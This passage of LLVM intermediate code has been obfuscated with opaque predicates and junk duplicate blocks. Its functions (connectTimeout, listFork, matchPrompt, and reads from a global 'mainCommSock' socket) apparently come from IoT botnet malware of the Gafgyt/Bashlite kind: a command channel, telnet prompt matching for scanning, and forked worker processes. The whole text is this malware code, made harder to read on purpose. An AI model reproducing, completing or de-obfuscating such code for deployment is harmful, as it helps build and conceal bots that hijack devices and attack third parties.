  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %133
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %156
  %243 = load i32, i32* @mainCommSock, align 4
  %244 = call i64 @recv(i32 %243, i8* %16, i64 1, i32 0)
  %245 = icmp ne i64 %244, 1
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %176
  %246 = load i8*, i8** %17, align 8
  store i8 0, i8* %246, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %205
  %247 = load i8*, i8** %17, align 8
  store i8 0, i8* %247, align 1
  %248 = load i32, i32* %18, align 4
  store i32 %248, i32* %4, align 4
  br label %originalBB60
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %139

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %137

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = load i32, i32* @x.51
  %56 = load i32, i32* @y.52
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %63, i64 0, i64 0
  %65 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %64) #5, !srcloc !4
  %66 = extractvalue { i64, i64* } %65, 0
  %67 = extractvalue { i64, i64* } %65, 1
  %68 = trunc i64 %66 to i32
  store i32 %68, i32* %17, align 4
  %69 = ptrtoint i64* %67 to i64
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %18, align 4
  %71 = load i32, i32* @x.51
  %72 = load i32, i32* @y.52
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %79

; <label>:79:                                     ; preds = %originalBBpart2
  %80 = load i32, i32* @x.51
  %81 = load i32, i32* @y.52
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  %88 = load i32, i32* %6, align 4
  %89 = srem i32 %88, 64
  %90 = zext i32 %89 to i64
  %91 = shl i64 1, %90
  %92 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %93 = load i32, i32* %6, align 4
  %94 = sdiv i32 %93, 64
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [16 x i64], [16 x i64]* %92, i64 0, i64 %95
  %97 = load i64, i64* %96, align 8
  %98 = or i64 %97, %91
  store i64 %98, i64* %96, align 8
  %99 = load i32, i32* %6, align 4
  %100 = add nsw i32 %99, 1
  %101 = call i32 @select(i32 %100, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %102 = icmp sgt i32 %101, 0
  %103 = load i32, i32* @x.51
  %104 = load i32, i32* @y.52
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart242, label %originalBB1alteredBB

originalBBpart242:                                ; preds = %originalBB1
  br i1 %102, label %111, label %119

; <label>:111:                                    ; preds = %originalBBpart242
  store i32 4, i32* %13, align 4
  %112 = load i32, i32* %6, align 4
  %113 = bitcast i32* %14 to i8*
  %114 = call i32 @getsockopt(i32 %112, i32 1, i32 4, i8* %113, i32* %13) #5
  %115 = load i32, i32* %14, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %111
  store i32 0, i32* %5, align 4
  br label %164

; <label>:118:                                    ; preds = %111
  br label %120

; <label>:119:                                    ; preds = %originalBBpart242
  store i32 0, i32* %5, align 4
  br label %164

; <label>:120:                                    ; preds = %118
  %121 = load i32, i32* @x.51
  %122 = load i32, i32* @y.52
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %120
  %129 = load i32, i32* @x.51
  %130 = load i32, i32* @y.52
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %138

; <label>:137:                                    ; preds = %45
  store i32 0, i32* %5, align 4
  br label %164

; <label>:138:                                    ; preds = %originalBBpart246
  br label %139

; <label>:139:                                    ; preds = %138, %37
  %140 = load i32, i32* @x.51
  %141 = load i32, i32* @y.52
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %139
  %148 = load i32, i32* %6, align 4
  %149 = call i32 (i32, i32, ...) @fcntl(i32 %148, i32 3, i8* null)
  %150 = sext i32 %149 to i64
  store i64 %150, i64* %15, align 8
  %151 = load i64, i64* %15, align 8
  %152 = and i64 %151, -2049
  store i64 %152, i64* %15, align 8
  %153 = load i32, i32* %6, align 4
  %154 = load i64, i64* %15, align 8
  %155 = call i32 (i32, i32, ...) @fcntl(i32 %153, i32 4, i64 %154)
  store i32 1, i32* %5, align 4
  %156 = load i32, i32* @x.51
  %157 = load i32, i32* @y.52
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart255, label %originalBB48alteredBB

originalBBpart255:                                ; preds = %originalBB48
  br label %164

; <label>:164:                                    ; preds = %originalBBpart255, %137, %119, %117, %36
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %54
  %166 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %167 = getelementptr inbounds [16 x i64], [16 x i64]* %166, i64 0, i64 0
  %168 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %167) #5, !srcloc !4
  %169 = extractvalue { i64, i64* } %168, 0
  %170 = extractvalue { i64, i64* } %168, 1
  %171 = trunc i64 %169 to i32
  store i32 %171, i32* %17, align 4
  %172 = ptrtoint i64* %170 to i64
  %173 = trunc i64 %172 to i32
  store i32 %173, i32* %18, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  %174 = load i32, i32* %6, align 4
  %_ = sub i32 %174, 64
  %gen = mul i32 %_, 64
  %_2 = shl i32 %174, 64
  %_3 = sub i32 0, %174
  %gen4 = add i32 %_3, 64
  %_5 = sub i32 0, %174
  %gen6 = add i32 %_5, 64
  %175 = srem i32 %174, 64
  %176 = zext i32 %175 to i64
  %_7 = sub i64 1, %176
  %gen8 = mul i64 %_7, %176
  %_9 = sub i64 1, %176
  %gen10 = mul i64 %_9, %176
  %_11 = shl i64 1, %176
  %_12 = sub i64 0, 1
  %gen13 = add i64 %_12, %176
  %_14 = sub i64 0, 1
  %gen15 = add i64 %_14, %176
  %_16 = sub i64 0, 1
  %gen17 = add i64 %_16, %176
  %177 = shl i64 1, %176
  %178 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %179 = load i32, i32* %6, align 4
  %_18 = sub i32 %179, 64
  %gen19 = mul i32 %_18, 64
  %180 = sdiv i32 %179, 64
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds [16 x i64], [16 x i64]* %178, i64 0, i64 %181
  %183 = load i64, i64* %182, align 8
  %_20 = sub i64 %183, %177
  %gen21 = mul i64 %_20, %177
  %_22 = sub i64 0, %183
  %gen23 = add i64 %_22, %177
  %_24 = shl i64 %183, %177
  %_25 = shl i64 %183, %177
  %_26 = sub i64 0, %183
  %gen27 = add i64 %_26, %177
  %_28 = sub i64 0, %183
  %gen29 = add i64 %_28, %177
  %184 = or i64 %183, %177
  store i64 %184, i64* %182, align 8
  %185 = load i32, i32* %6, align 4
  %_30 = sub i32 %185, 1
  %gen31 = mul i32 %_30, 1
  %_32 = shl i32 %185, 1
  %_33 = sub i32 0, %185
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %185, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 %185, 1
  %gen38 = mul i32 %_37, 1
  %_39 = sub i32 %185, 1
  %gen40 = mul i32 %_39, 1
  %186 = add nsw i32 %185, 1
  %187 = call i32 @select(i32 %186, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %188 = icmp sgt i32 %187, 0
  br label %originalBB1

originalBB44alteredBB:                            ; preds = %originalBB44, %120
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %139
  %189 = load i32, i32* %6, align 4
  %190 = call i32 (i32, i32, ...) @fcntl(i32 %189, i32 3, i8* null)
  %191 = sext i32 %190 to i64
  store i64 %191, i64* %15, align 8
  %192 = load i64, i64* %15, align 8
  %_49 = sub i64 %192, -2049
  %gen50 = mul i64 %_49, -2049
  %_51 = sub i64 0, %192
  %gen52 = add i64 %_51, -2049
  %_53 = shl i64 %192, -2049
  %193 = and i64 %192, -2049
  store i64 %193, i64* %15, align 8
  %194 = load i32, i32* %6, align 4
  %195 = load i64, i64* %15, align 8
  %196 = call i32 (i32, i32, ...) @fcntl(i32 %194, i32 4, i64 %195)
  store i32 1, i32* %5, align 4
  br label %originalBB48
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %79

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @x.53
  %12 = load i32, i32* @y.54
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i64, i64* @numpids, align 8
  %20 = add i64 %19, 1
  store i64 %20, i64* @numpids, align 8
  %21 = load i64, i64* @numpids, align 8
  %22 = add i64 %21, 1
  %23 = mul i64 %22, 4
  %24 = call noalias i8* @malloc(i64 %23) #5
  %25 = bitcast i8* %24 to i32*
  store i32* %25, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %26 = load i32, i32* @x.53
  %27 = load i32, i32* @y.54
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart29, %originalBBpart2
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = load i64, i64* @numpids, align 8
  %38 = sub i64 %37, 1
  %39 = icmp ult i64 %36, %38
  br i1 %39, label %40, label %69

; <label>:40:                                     ; preds = %34
  %41 = load i32*, i32** @pids, align 8
  %42 = load i32, i32* %4, align 4
  %43 = zext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  %45 = load i32, i32* %44, align 4
  %46 = load i32*, i32** %3, align 8
  %47 = load i32, i32* %4, align 4
  %48 = zext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 %45, i32* %49, align 4
  br label %50

; <label>:50:                                     ; preds = %40
  %51 = load i32, i32* @x.53
  %52 = load i32, i32* @y.54
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %50
  %59 = load i32, i32* %4, align 4
  %60 = add i32 %59, 1
  store i32 %60, i32* %4, align 4
  %61 = load i32, i32* @x.53
  %62 = load i32, i32* @y.54
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart29, label %originalBB5alteredBB

originalBBpart29:                                 ; preds = %originalBB5
  br label %34

; <label>:69:                                     ; preds = %34
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #5
  %77 = load i32*, i32** %3, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %2, align 4
  store i32 %78, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %8
  %80 = load i32, i32* %1, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %10
  %81 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %81
  %gen = add i64 %_, 1
  %_1 = shl i64 %81, 1
  %82 = add i64 %81, 1
  store i64 %82, i64* @numpids, align 8
  %83 = load i64, i64* @numpids, align 8
  %_2 = sub i64 0, %83
  %gen3 = add i64 %_2, 1
  %84 = add i64 %83, 1
  %_4 = shl i64 %84, 4
  %85 = mul i64 %84, 4
  %86 = call noalias i8* @malloc(i64 %85) #5
  %87 = bitcast i8* %86 to i32*
  store i32* %87, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %50
  %88 = load i32, i32* %4, align 4
  %_6 = sub i32 0, %88
  %gen7 = add i32 %_6, 1
  %89 = add i32 %88, 1
  store i32 %89, i32* %4, align 4
  br label %originalBB5
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.55
  %3 = load i32, i32* @y.56
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.487, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #9
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.55
  %20 = load i32, i32* @y.56
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %177, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = sext i32 %28 to i64
  %30 = load i8*, i8** %12, align 8
  %31 = call i64 @strlen(i8* %30) #9
  %32 = icmp ult i64 %29, %31
  br i1 %32, label %33, label %180

; <label>:33:                                     ; preds = %27
  br label %34

; <label>:34:                                     ; preds = %originalBBpart238, %33
  %35 = load i32, i32* @x.55
  %36 = load i32, i32* @y.56
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %13, align 4
  %44 = load i32, i32* %15, align 4
  %45 = icmp sgt i32 %43, %44
  %46 = load i32, i32* @x.55
  %47 = load i32, i32* @y.56
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %136

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i32, i32* @x.55
  %56 = load i32, i32* @y.56
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load i8*, i8** %11, align 8
  %64 = load i32, i32* %13, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %15, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 0
  %74 = load i32, i32* @x.55
  %75 = load i32, i32* @y.56
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br i1 %73, label %134, label %82

; <label>:82:                                     ; preds = %originalBBpart216
  %83 = load i8*, i8** %11, align 8
  %84 = load i32, i32* %13, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i32, i32* %15, align 4
  %88 = sext i32 %87 to i64
  %89 = sub i64 0, %88
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 %92, 32
  br i1 %93, label %134, label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* @x.55
  %96 = load i32, i32* @y.56
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %94
  %103 = load i8*, i8** %11, align 8
  %104 = load i32, i32* %13, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i32, i32* %15, align 4
  %108 = sext i32 %107 to i64
  %109 = sub i64 0, %108
  %110 = getelementptr inbounds i8, i8* %106, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %113 = icmp eq i32 %112, 13
  %114 = load i32, i32* @x.55
  %115 = load i32, i32* @y.56
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart228, label %originalBB18alteredBB

originalBBpart228:                                ; preds = %originalBB18
  br i1 %113, label %134, label %122

; <label>:122:                                    ; preds = %originalBBpart228
  %123 = load i8*, i8** %11, align 8
  %124 = load i32, i32* %13, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8, i8* %123, i64 %125
  %127 = load i32, i32* %15, align 4
  %128 = sext i32 %127 to i64
  %129 = sub i64 0, %128
  %130 = getelementptr inbounds i8, i8* %126, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = sext i8 %131 to i32
  %133 = icmp eq i32 %132, 10
  br label %134

; <label>:134:                                    ; preds = %122, %originalBBpart228, %82, %originalBBpart216
  %135 = phi i1 [ true, %originalBBpart228 ], [ true, %82 ], [ true, %originalBBpart216 ], [ %133, %122 ]
  br label %136

; <label>:136:                                    ; preds = %134, %originalBBpart24
  %137 = phi i1 [ false, %originalBBpart24 ], [ %135, %134 ]
  br i1 %137, label %138, label %157

; <label>:138:                                    ; preds = %136
  %139 = load i32, i32* @x.55
  %140 = load i32, i32* @y.56
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %138
  %147 = load i32, i32* %15, align 4
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %15, align 4
  %149 = load i32, i32* @x.55
  %150 = load i32, i32* @y.56
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart238, label %originalBB30alteredBB

originalBBpart238:                                ; preds = %originalBB30
  br label %34

; <label>:157:                                    ; preds = %136
  %158 = load i8*, i8** %11, align 8
  %159 = load i32, i32* %13, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i8, i8* %158, i64 %160
  %162 = load i32, i32* %15, align 4
  %163 = sext i32 %162 to i64
  %164 = sub i64 0, %163
  %165 = getelementptr inbounds i8, i8* %161, i64 %164
  %166 = load i8, i8* %165, align 1
  %167 = sext i8 %166 to i32
  %168 = load i8*, i8** %12, align 8
  %169 = load i32, i32* %14, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %174 = icmp eq i32 %167, %173
  br i1 %174, label %175, label %176

; <label>:175:                                    ; preds = %157
  store i32 1, i32* %10, align 4
  br label %181

; <label>:176:                                    ; preds = %157
  br label %177

; <label>:177:                                    ; preds = %176
  %178 = load i32, i32* %14, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %14, align 4
  br label %27

; <label>:180:                                    ; preds = %27
  store i32 0, i32* %10, align 4
  br label %181

; <label>:181:                                    ; preds = %180, %175
  %182 = load i32, i32* %10, align 4
  ret i32 %182

originalBBalteredBB:                              ; preds = %originalBB, %1
  %183 = alloca i32, align 4
  %184 = alloca i8*, align 8
  %185 = alloca i8*, align 8
  %186 = alloca i32, align 4
  %187 = alloca i32, align 4
  %188 = alloca i32, align 4
  store i8* %0, i8** %184, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.487, i32 0, i32 0), i8** %185, align 8
  %189 = load i8*, i8** %184, align 8
  %190 = call i64 @strlen(i8* %189) #9
  %191 = trunc i64 %190 to i32
  store i32 %191, i32* %186, align 4
  store i32 0, i32* %188, align 4
  store i32 0, i32* %187, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %192 = load i32, i32* %13, align 4
  %193 = load i32, i32* %15, align 4
  %194 = icmp sgt i32 %192, %193
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %195 = load i8*, i8** %11, align 8
  %196 = load i32, i32* %13, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds i8, i8* %195, i64 %197
  %199 = load i32, i32* %15, align 4
  %200 = sext i32 %199 to i64
  %_ = sub i64 0, 0
  %gen = add i64 %_, %200
  %_7 = sub i64 0, %200
  %gen8 = mul i64 %_7, %200
  %_9 = shl i64 0, %200
  %_10 = shl i64 0, %200
  %_11 = sub i64 0, %200
  %gen12 = mul i64 %_11, %200
  %_13 = sub i64 0, %200
  %gen14 = mul i64 %_13, %200
  %201 = sub i64 0, %200
  %202 = getelementptr inbounds i8, i8* %198, i64 %201
  %203 = load i8, i8* %202, align 1
  %204 = sext i8 %203 to i32
  %205 = icmp eq i32 %204, 0
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %94
  %206 = load i8*, i8** %11, align 8
  %207 = load i32, i32* %13, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds i8, i8* %206, i64 %208
  %210 = load i32, i32* %15, align 4
  %211 = sext i32 %210 to i64
  %_19 = shl i64 0, %211
  %_20 = sub i64 0, 0
  %gen21 = add i64 %_20, %211
  %_22 = shl i64 0, %211
  %_23 = sub i64 0, %211
  %gen24 = mul i64 %_23, %211
  %_25 = sub i64 0, 0
